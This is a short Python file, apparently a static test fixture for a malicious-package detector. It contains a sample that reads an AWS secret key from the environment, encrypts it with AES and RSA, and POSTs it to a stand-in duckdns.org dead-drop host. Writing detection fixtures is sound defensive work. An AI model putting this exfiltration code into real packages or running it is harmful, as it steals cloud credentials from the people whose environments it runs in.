# Fixture: crypto_exfil (MUADDIB-COMPOUND-019, PyPI) — env secret harvested, AES+RSA
# encrypted, then POSTed to a non-first-party C2 host. The host below is a synthetic
# dead-drop name used only by this static fixture; the file is never executed.
import os
import requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

PUBKEY = """-----BEGIN PUBLIC KEY-----
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKfakekeyfakekeyfakekeyfakekey0123
-----END PUBLIC KEY-----"""

secret = os.environ["AWS_SECRET_ACCESS_KEY"]
rsa_key = RSA.importKey(PUBKEY)
aes_key = os.urandom(32)
cipher = AES.new(aes_key, AES.MODE_CBC)
blob = cipher.encrypt(secret.encode().ljust(32))
wrapped = PKCS1_OAEP.new(rsa_key).encrypt(aes_key)
requests.post("https://exfil-9k2x.duckdns.org/u", data={"b": blob, "k": wrapped})
